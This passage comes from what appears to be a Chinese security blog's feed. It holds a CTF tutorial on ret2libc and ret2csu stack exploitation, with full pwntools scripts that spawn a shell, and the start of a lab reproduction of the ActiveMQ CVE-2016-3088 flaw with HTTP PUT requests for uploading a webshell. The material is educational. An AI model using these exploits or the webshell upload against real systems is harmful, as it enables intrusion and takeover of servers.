class="line"></span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[&#39;__libc_start_main&#39;]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line"></span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;__libc_start_main&#39;, libc_start_main_addr)</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><p>train.cs.nctu.edu.tw: ret2libc</p></li><li><p>train.cs.nctu.edu.tw: rop</p></li><li><p>2013-PlaidCTF-ropasaurusrex</p></li><li><p>Defcon 2015 Qualifier: R0Pbaby</p></li></ul><h1 id="Intermediate-ROP"><a href="#Intermediate-ROP" class="headerlink" title="Intermediate ROP"></a>Intermediate ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><blockquote><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>这里我们可以利用以下几点</p><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li></ul><h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><p>这里我们以一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec level5   </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;level5&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序为 64 位，开启了堆栈不可执行保护。</p><p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本利用思路如下</p><ul><li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li><li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li><li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li><li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li></ul><p>exp 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">debug &#x3D; True</span><br><span class="line"></span><br><span class="line">context(log_level &#x3D; &#39;debug&#39;, arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;level5&quot;)</span><br><span class="line">    level5&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line">else:</span><br><span class="line">    link &#x3D; &quot;x.x.x.x:xx&quot;</span><br><span class="line">    ip, port &#x3D; map(lambda x:x.strip(), link.split(&#39;:&#39;))</span><br><span class="line">    sh &#x3D; remote(ip, port)</span><br><span class="line">    elf&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line"></span><br><span class="line">write_got &#x3D; level5.got[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; level5.got[&#39;read&#39;]</span><br><span class="line">main_addr &#x3D; level5.symbols[&#39;main&#39;]</span><br><span class="line">bss_base &#x3D; level5.bss()</span><br><span class="line">csu_front_addr &#x3D; 0x0000000000400600</span><br><span class="line">csu_end_addr &#x3D; 0x000000000040061A</span><br><span class="line">fakeebp &#x3D; &#39;b&#39; * 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">    # pop rbx,rbp,r12,r13,r14,r15</span><br><span class="line">    # rbx should be 0,</span><br><span class="line">    # rbp should be 1,enable not to jump</span><br><span class="line">    # r12 should be the function we want to call</span><br><span class="line">    # rdi&#x3D;edi&#x3D;r15d</span><br><span class="line">    # rsi&#x3D;r14</span><br><span class="line">    # rdx&#x3D;r13</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x80 + fakeebp</span><br><span class="line">    payload +&#x3D; p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload +&#x3D; p64(csu_front_addr)</span><br><span class="line">    payload +&#x3D; &#39;a&#39; * 0x38</span><br><span class="line">    payload +&#x3D; p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="line">## write(1,write_got,8)</span><br><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br><span class="line">#write(1, writ_got_addr, 8)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u64(sh.recv(8))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;, write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">execve_addr &#x3D; libc_base + libc.dump(&#39;execve&#39;)</span><br><span class="line">log.success(&#39;execve_addr &#39; + hex(execve_addr))</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## read(0,bss_base,16)</span><br><span class="line">## read execve_addr and &#x2F;bin&#x2F;sh\x00</span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">csu(0, 1, read_got, 16, bss_base, 0, main_addr)</span><br><span class="line">#read(0,bss_base,16)</span><br><span class="line">sh.send(p64(execve_addr) + &#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## execve(bss_base+8)</span><br><span class="line">csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)</span><br><span class="line">#execve(&#x2F;bin&#x2F;sh,0,0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>gadget构造的payload要在末尾加上0x38个填充字符</p><p>gadget1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p>gadget2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>rsp  8 *  (8 -1)  </p><p>ps: add rsp,8  + pop * 6 + ret -call</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><h5 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h5><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p><h5 id="改进-1-提前控制-RBX-与-RBP"><a href="#改进-1-提前控制-RBX-与-RBP" class="headerlink" title="改进 1 - 提前控制 RBX 与 RBP"></a>改进 1 - 提前控制 RBX 与 RBP<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#1-rbx-rbp"></a></h5><p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p><h5 id="改进-2-多次利用"><a href="#改进-2-多次利用" class="headerlink" title="改进 2 - 多次利用 "></a>改进 2 - 多次利用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#2-"></a></h5><p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p><ul><li>漏洞可以被多次触发</li><li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li></ul><p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p><h5 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#gadget"></a></h5><p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p><p>需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p><ul><li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li><li>利用中间部分的代码控制了 rdx，rsi，edi。</li></ul><p>而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，<strong>可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><ul><li>2016 XDCTF pwn100</li><li>2016 华山杯 SU_PWN</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a></p><p><a href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></p><p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p><p><a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a></p><p><a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;栈介绍&quot;&gt;&lt;a href=&quot;#栈介绍&quot; class=&quot;headerlink&quot; title=&quot;栈介绍&quot;&gt;&lt;/a&gt;栈介绍&lt;/h1&gt;&lt;h3 id=&quot;基本栈介绍&quot;&gt;&lt;a href=&quot;#基本栈介绍&quot; class=&quot;headerlink&quot; title=&quot;基本栈介绍&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Pwn" scheme="http://www.ol4three.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</title>
    <link href="http://www.ol4three.com/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/"/>
    <id>http://www.ol4three.com/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/</id>
    <published>2020-12-17T06:50:38.000Z</published>
    <updated>2020-12-23T08:51:08.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Apache ActiveMQ 5.0.0 – 5.13.2<br>ActiveMQ在5.12.x~5.13.x版本中，默认关闭了fileserver这个应用<br>5.14.0版本以后，彻底删除fileserver</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 <a href="http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip">ActiveMQ 5.7.0 源码</a> ，可以看到后台处理 PUT 的关键代码如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154823813.png" alt="image-20201217154823813"></p><p>用户可以上传文件到指定目录，该路径在 <code>conf/jetty.xml</code> 中定义，如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p><p>顺着 PUT 方法追踪，可以看到调用了如下函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155145859.png" alt="image-20201217155145859"></p><p>同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155615911.png" alt="image-20201217155615911"></p><p>由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-上传webshell"><a href="#1-上传webshell" class="headerlink" title="1.上传webshell"></a>1.上传webshell</h3><p>可以爆破目录(未复现成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;123&#x2F;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 4</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>admin 登陆查看目录</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151345913.png" alt="image-20201217151345913"></p><p>首先 PUT 一个  Webshell 的txt到 fileserver 目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 330</span><br><span 